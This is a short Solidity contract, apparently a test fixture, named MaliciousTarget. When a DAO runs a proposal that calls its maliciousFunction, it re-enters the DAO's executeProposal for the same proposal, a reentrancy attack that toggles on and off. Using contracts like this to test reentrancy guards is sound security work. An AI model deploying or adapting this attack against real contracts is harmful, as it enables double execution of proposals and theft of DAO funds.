// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFinCubeDAO {
    function executeProposal(uint256 proposalId) external;
}

contract MaliciousTarget {
    address public dao;
    bool public attackEnabled;
    uint256 public targetProposalId;

    function setDAOContract(address _dao) external {
        dao = _dao;
    }

    function enableAttack(uint256 proposalId) external {
        targetProposalId = proposalId;
        attackEnabled = true;
    }

    function disableAttack() external {
        attackEnabled = false;
    }

    // Function that will be called by DAO.execute during proposal execution
    function maliciousFunction() external {
        if (attackEnabled) {
            // attempt to reenter DAO.executeProposal for the same proposalId (reentrancy)
            IFinCubeDAO(dao).executeProposal(targetProposalId);
        }
    }
}
